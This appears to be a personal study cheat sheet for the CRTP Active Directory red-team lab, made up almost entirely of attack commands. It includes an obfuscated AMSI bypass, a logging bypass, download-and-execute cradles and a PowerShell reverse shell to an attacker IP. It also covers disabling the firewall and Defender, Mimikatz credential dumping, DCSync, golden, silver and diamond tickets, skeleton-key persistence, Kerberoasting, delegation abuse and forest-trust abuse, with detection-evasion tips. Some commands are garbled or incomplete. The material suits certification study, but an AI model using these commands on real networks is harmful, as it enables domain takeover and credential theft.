# CRTP

Attacking path: 
1- privesc -> local admin access on other PC
2- revshell on junkings -> check sessions on other pc -> extract creds.

# Enumuration
```powershell
# Find the groups the user belongs to
Get-DomainUser -Identity Administrator -Properties MemberOf | Select-Object -ExpandProperty MemberOf
Get-DomainGroupMember -Identity "Group_Name"

# Find the groups the computer belongs to
Get-DomainComputer -Identity "dcorp-dc.dollarcorp.moneycorp.local"   #check distinguishedname for the OU. check primarygroupid for the Group
get-domaingroup | select name, objectsid   #Match the SID from the previous step with this to get the group name
```




# CMD & PS 
```powershell
# Use Invishell
C:/AD/Tools/InviShell/RunWithRegistryNonAdmin.bat
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1')) 

# or use sbloggingbypass.txt + AMSI Bypass
iex (iwr http://10.0.10.16/sbloggingbypass.txt-UseBasicParsing)
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))

# Enable inbound traffic
C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
. C:\AD\Tools\PowerUp.ps1
New-NetFirewallRule -DisplayName "Allow Inbound Traffic" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8001
netsh advfirewall set allprofiles state off
powershell.exe iex (iwr http://172.16.100.53/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.53 -Port 443
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lnvp 8001

```

# Priv Esc
```powershell
# List examples of how to abuse a service
help Invoke-ServiceAbuse -Examples
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose  #Adding the current user to the admin group. you need to logoff then logon again inorder to make it working
```

# Finding local admin access
```powershell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess

#you can connect to the other computer using the following command
winrs -r:dcorp-adminsrv cmd
set username
set computername
```

# Finding domain admin session
```powershell
. C:\AD\Tools\Invoke-SessionHunter.ps1
Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
winrs -r:dcorp-mgmt cmd /c "set computername && set username"
```

# Lateral Movement 
```powershell
One-To-One
#Avoid using psexec as it is too noisy. instead, to use "Enter-PSSession" you need Admin Privs
Enter-PSSession -ComputerName <dcorp-adminsrv>
#After getting the access run `whomai` to get the username, run `hostname` to get the pc name

Using Invoke-Command   #To send command to a machine
Invoke-Command -ScriptBlock {$env:username;$env:computername} -ComputerName dcorp-mgmt

#you can use winrs in place of PSRemoting to evade the logging (more stealthy)
winrs -r:dcorp-mgmt hostname;whoami  #run command to check whether we have access or not
winrs -r:dcorp-mgmt cmd  #get a cmd shell on mgmt machine
```
```powershell
One-To-Many
#Execute a Command
Invoke-Command -Scriptblock {ls env:} -ComputerName (Get-Content <list_of_servers>)
#Execute a Script
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```

```powershell
#storing the session in a variable
$var = Enter-PSSession -ComputerName dcorp-admin

#Enter the session
Enter-PSSession -Session $var

#Interact with the target machine
Invoke-Command -Session $var -ScriptBlock {ls env:}
```

# Lateral Movement - Invoke-Mimikatz
```powershell
#After Abusing winrs
#Use SafetyKatz.exe to dump the hashes
#1- Host Loader.exe & Run the following command on the reverse shell
PS> iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe

#2- Now, copy the Loader.exe to dcorp-mgmt:
PS> echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe

#3- Using winrs, add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt: 
PS> $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"

#4- Use Loader.exe to download and execute SafetyKatz.exe in-memory on dcorp-mgmt
PS> 

#5- 
```

```Powershell
Over-Pass-The-Hash  #for better offsec use AES keys than NTLM
# Using Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'

# Using SafetyKatz
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"

#Using Rubeus (Recommended)
#if you don't have elevated session use below
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt

#if you have elevated session use below
#1- Create a new process & inject the ticket init
C:\Windows\system32> C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:<aes256key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

#2- Access the DC from the new process  #remember that this is logon type 9, means you will still have the same username in your CMD. However, if you use winrs to connect to the machine you will have the new creds
winrs -r:dcorp-dc cmd /c set username  #show the username
winrs -r:dcorp-dc cmd  #interactive CMD with new creds


DCSync
# Using MimiKatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'

# Using SafetyKatz
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

# Derivative Local Admin
```powershell
Derivative means, if user A in machine A has local admin access on machine B & user B in machine B, has local admin access on machine C, this means user A has local admin access on machine C.
#1- Find machines on which you have local admin privilege.
PS> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS> Find-PSRemotingLocalAdminAccess

#2- Applocker check
#if you attempt to run loader.exe it will result in an error "Cannot invoke method. Method invocation is supported on core type in this language mode" This program is blocked by group policy. Let's check if Applocker is configured.
PS> $ExecutionContext.SessionState.LanguageMode  #Check language mode
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections  #list app locker policy
```
![image](https://github.com/user-attachments/assets/a073bfb1-dd42-4dd1-829c-650b384c942a)

```powershell
1-  Rule No.1 Allow every user to run all scripts located in the program files folder
2-  Rule No.2 Allow every user to run all scripts located in the windows32 folder

# This means you can drop scripts in the program file directory and execute them.
#1- Disable Windows Defender on the machine
PS> Set-MpPreference -DisableRealtimeMonitoring $true -Verbose

#2- Copy Invoke-MimiEx.ps1 to the machine
PS> Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'

#3- Run Invoke MimiEx
PS> cd 'C:\Program File'
PS> .\Invoke-MimiEx.ps1

#4- Over-Pass-The-Hash
PS> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:cmd.exe" "exit"

#you will get a new CMD process. Run invishall and PSRemotingLocalAdminAccess.ps1
PS> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
PS> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS> Find-PSRemotingLocalAdminAccess -Verbose

#5- Copy Loader.exe
PS> echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
PS> winrs -r:dcorp-mgmt cmd

#6- Make sure your port forwarding is on
PS> netsh interface portproxy show V4tov4

#7- Download and execute SaftyKatz on dcorp-mgmt
PS> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit

#8- #4- Over-Pass-The-Hash
PS> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:cmd.exe" "exit"
```

# Extracting Credentials from Vault
```powershell
# Check local admin access on another machine
PS> Enter-PSSession -ComputerName dcorp-mgmt

# Don't forget to run sbloggingbypass.txt + AMSI Bypass

# Download and execute Mimikatz
PS> iex (iwr http://172.16.100.X/Invoke-Mimi.ps1 -UseBasicParsing)
PS> Invoke-Mimi -Command '"sekurlsa::ekeys"'

# Look for credentials from the credentials vault
PS> Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'

# Over-Pass-The-Hash
PS> C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:<aes256key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

# Persistence - Golden Ticket
```powershell
# To perform a Golden Ticket attack. You can use Mimikatz or DCSync to extract the AES key for krbtgt account.

# Generate a Golden Ticket using Rubeus
#1- Start a process with Domain Admin Privileges
PS> C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:<aes256key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

#2- Copy Loader to the DC & Start Port forwarding
PS> echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y 
PS> winrs -r:dcorp-dc cmd
PS> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x

#3- Run SafetyKatz to extract aes256key for krbtgt
PS> C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

#4- Use Rubeus to generate a Golden Ticket. This will create a command to forage a Golden Ticket
PS> C:\AD\Tools\Rubeus.exe golden /aes256:<aes256key> /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
PS> C:\AD\Tools\Rubeus.exe golden /aes256:<aes256key> /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 
AM" /minpassage:1 /logoncount:35 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local 
/uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
C:\AD\Tools> winrs -r:dcorp-dc cmd
C:\AD\Tools> set username; set computername

# Generate a Golden Ticket using BetterSafetyKatz
#1- Use the below to create a golden ticket
C:\Windows\system32>  C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21
719815819-3726368948-3917688648 /aes256:<aes256key> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

#2- list all tickets
C:\Windows\system32> klist
C:\Windows\system32> dir \\dcorp-dc\C$
```

# Persistence - Silver Ticket
```powershell
# To perform a Silver Ticket attack. You need to extract the TGS (secret) from the service account. There will be no interaction with DC.

# Generate a Silver Ticket using Rubeus
C:\AD\Tools> C:\AD\Tools\Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:<NTLM> /sid:S-1
5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt

#2- list all tickets
C:\AD\Tools\Rubeus.exe klist

#3- You have the HTTP service ticket for dcorp-dc, try to access it using winrs
C:\AD\Tools>winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd
C:\Users\Administrator>set username; set computername

# Generate a Silver Ticket using BetterSafetyKatz
#For accessing WMI, we need to create two tickets - one for HOST service and another for RPCSS.
#1- Create a HOST service ticket
C:\AD\Tools> C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:<NTLM> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

#2- Inject a RPCSS ticket
C:\AD\Tools> C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:<NTLM> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

#3- check if the tickets are present
C:\Windows\system32> klist
C:\Windows\system32> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
C:\Windows\system32> Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
```

# Persisitence - Dimond Ticket
```powershell
# When you submit a TGT in a Golden Ticket attack, the blue team can detect it by tracking where the request for that TGT originated. To make detection more difficult, the Diamond Ticket technique was introduced, which complicates the blue team's ability to trace and identify the attack. After receiving the TGT from the KDC (in the sec step) we will edit it and then submit it to the KDC again.

#1- Use Rubeus to generate Dimoed ticket
C:\Windows\system32> C:\AD\Tools\Rubeus.exe diamond /krbkey:<aes256key> /tgtdeleg /enctype:aes /ticketuser:administrator 
/domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

#2- Use winrs to access the DC
C:\Windows\system32> winrs -r:dcorp-dc cmd
C:\Windows\system32> set username
C:\Windows\system32> set computername
```

# Persistence - Skeleton Key
```powershell
# Skeleton key allows you to access as any user with a single password
#1- Inject a skeleton key on a DC
C:\AD> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local

#2- Now it's possible to access any machine with a valid username and password as "mimikatz"
Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
```

Kerberoasting Attack
```powershell
#In a Kerberoasting attack, the attacker requests a TGS ticket from the Key Distribution Center (KDC) on behalf of a service account.

#1- Find a user accounts used as service accounts
Get-ADUser-Filter {ServicePrincipalName-ne "$null"} -Properties ServicePrincipalName
Get-DomainUser -SPN

#2- Use Rubeus to request a TGS
Rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /user:svcadmin /simple /outfile:C:\AD\Tools\hashes.txt  #once saved. Don't forget to remove the port No. ":1433"

#3- Use John the Ripper
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

Kerberoasting Attack - AS-REP
```powershell
#Occurs if the kerberos preauthentication is disabled. Or if you have sufficient rights (GenericWrite or GenericAll), you can disable kerberos preauth.

#1- Enum accounts with Kerberos Preauth disabled
Get-DomainUser-PreauthNotRequired-Verbose  #Using PowerView
Get-ADUser-Filter {DoesNotRequirePreAuth-eq $True} -Properties DoesNotRequirePreAuth  #Using AD module

#2- Force disable kerberos Preauth
Find-InterestingDomainAcl-ResolveGUIDs | ?{$_.IdentityReferenceName-match "RDPUsers"}  #Enum the permissions for RDPUsers
Set-DomainObject-Identity Control1User-XOR @{useraccountcontrol=4194304} -Verbose  #Force disabling kerberors

#Request encrypted AS-REP
Get-ASREPHash-UserName VPN1user-Verbose

#4- Use John the Ripper
john.exe--wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt


#If you have (GenericWrite or GenericAll) permission you can set SPN to a user the kerberost it.
#1- Enum the permissions
Find-InterestingDomainAcl-ResolveGUIDs | ?{$_.IdentityReferenceName-match "RDPUsers"}

#2- check if the user already has a SPN
Get-DomainUser-Identity supportuser | select serviceprincipalname  #Using PowerView
Get-ADUser-Identity supportuser-Properties ServicePrincipalName | select ServicePrincipalName  #Using AD module

#3- Set a SPN for the user (User must be unique in the forest)
Set-DomainObject -Identity support1user-Set @{serviceprincipalname=‘dcorp/whatever1'}  #Using PowerView
 Set-ADUser -Identity support1user-ServicePrincipalNames @{Add=‘dcorp/whatever1'}  #Using AD module

#4- Kerberoast the user and crack the hash
Rubeus.exe kerberoast /outfile:targetedhashes.txt
john.exe--wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
```

Unconstrained Delegation
```powershell
#Unconstrained delegation in Active Directory is a feature that allows a server or service to impersonate users across the entire network after they have authenticated to that server. Essentially, if a user authenticates to a machine with unconstrained delegation enabled, that machine can act on behalf of that user and access other services as if it were the user.

#1- Enum computers & Users which have unconstrained delegation enabled
Get-DomainComputer-UnConstrained  #powerview
Get-ADComputer-Filter {TrustedForDelegation-eq $True}  #AD Module
Get-ADUser-Filter {TrustedForDelegation-eq $True}  #AD Module

#make usre you have compromised the computer that having unconstrained delegation. expected attack path -> over pass the hash after extracting the credentials --> find local admin access on another machine --> if yes drop rubeus to the other machine and run it as monitor mode.

#2- enable monitor mode
Rubeus.exe monitor /interval:5 /nowrap

#3- force the DC to connect to the machine
MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local

#4- Pass the Ticket
Rubeus.exe ptt /tikcet:do..[]..TA==

#5- you can use DCSync attack
Invoke-Mimikatz-Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

Constrained Delegation
```powershell
# Occours when a user wants to access a service ex. web server. web server will ask KDC for a ticket, if the user account is not bloked for a delegation KDC will return a S4USelf, then web server will send the S4USelf to the KDC again requesting S4UProxy that allows the user to access the service. This will happen if the msDS-AllowedToDelegateTo field in listed.
# You can forge S4USelf ticket using S4U attack.

#1- List users with constrained delegation enabled
Get-DomainUser-TrustedToAuth  #PowerView
Get-ADObject-Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo  #AD Moudle
# Read the msds-allowedtodelegatedto in the output to know what service you will exploit

#2- Start the Attack
Rubeus.exe s4u /user:websvc /aes256:<aes256key> /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$

# Using Alternate Service Name
#1- List computers with constrained delegation enabled
Get-DomainComputer-TrustedToAuth  #PowerView

#2- Use alternate service name
Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:<aes256key> /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt

# After having ldap service on the DC you can run DCSync
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit" 
```

RBCD Delegation
```powershell
# Instead of SPNs on msDs-AllowedToDelegatTo on the front-end service like web service, access in this case is controlled by security descriptor of msDS-AllowedToActOnBehalfOfOtherIdentity like SQL Server
# you need to have write permission or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity

#1- Enumerate write permissions
Find-InterestingDomainACL
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}

#2- Configure the RBCD on the mgmt machine from student machine
Set-DomainRBCD -Idenetity dcorp-mgmt -DelegateFrom 'dcorp-student1$'
Get-DomainRBCD  #check the configuration. Read DelegatedDistinguishedName & SourceName

#3- Dump the AES key
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"
# if you have two different hashes for the same user check the SID. S-1-5-18 for real account; S-1-5-96-0-19 for Virtual account

#4- s4u pass the hash attack
Rubeus.exe s4u /user:dcorp-student1$ /aes256:<aes256key> /impersonateuser:Administrator /msdsspn:http/dcorp-mgmt /ptt
klist
winrs -r:dcorp-mgmt cmd
#keep in mind that you have the TGS not the TGT. means you can only access the dcorp-mgmt machine through http service only
```

Across Trusts
```powershell
# In an sIDHistory attack, the goal is to exploit the sIDHistory attribute of Active Directory objects (like users or groups) to escalate privileges. The sIDHistory attribute stores the Security Identifiers (SIDs) of the user from previous domains or previous states, and attackers can manipulate this to impersonate high-privilege accounts.
# If a user wants to access a service in a different domain, their DC can issue an inter-realm ticket. This ticket is used to authenticate the user to the DC of the other domain (the trusting domain) and access services there.
# In this attack, what you're forging is a Ticket Granting Ticket (TGT) that includes a fake or injected sIDHistory with the SID of a privileged account (like Domain Admin). Once you get a TGT with this forged sIDHistory, you can use it to request access to services as if you were the privileged account.

# Escale privelges from Domain Admin to Enterprise Admin
#1- DCSync Attack to get the trust key from the Account Type: TRUST_ACCOUNT
Invoke-Mimikatz-Command '"lsadump::dcsync /user:dcorp\mcorp$"'

#2- Forge inter-realm TGT #Page No.230
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-15-21-335606122-960912869-3279953914-519 /rc4:e9ab2e57f6397c19b62476e98e9521ac /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"

#OR using Golden Ticket Command
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 
/krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"

# To aboid suspicious logs by using Domanin Controllers group
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:dcorp-dc$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /groups:516 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"

# SID --> child domain (dollarcorp.moneycorp.local).
# group:516 --> Domain Controllers group (RID 516).
# SIDs --> Domain Controllers group in the parent domain (moneycorp.local).

#3- Use Rubeus to request TGS
Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
ls \\mcorp-dc.moneycorp.local\c$
```

Trusts Abuse Across Forests
```powershell
# In across forest trust any SID history between 500 & 1000 would be filtered out. Only explicit resources are allowed to be accessed from the AD to the other forest. 

#1- DCSync Attack to get the key from the TRUST_ACCOUNT
C:\AD\Tools\Safetykatz.exe "lsadump::dcsync /user:dcorp\eurocorp$" "exit"

#2- Forge inter-realm TGT 
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-15-21-335606122-960912869-3279953914-519 /rc4:e9ab2e57f6397c19b62476e98e9521ac /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"

#3- Use Rubeus to request TGS & access shared resources
Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
dir \\eurocorp-dc.eurocorp.local\c$   #if you try to access desk C, you will get access denied. You should access an explicit resource.
net view \\eurocorp-dc.eurocorp.local   #Enum all shares
dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp   #this would work fine

klist purge   #to delete all tickets
```














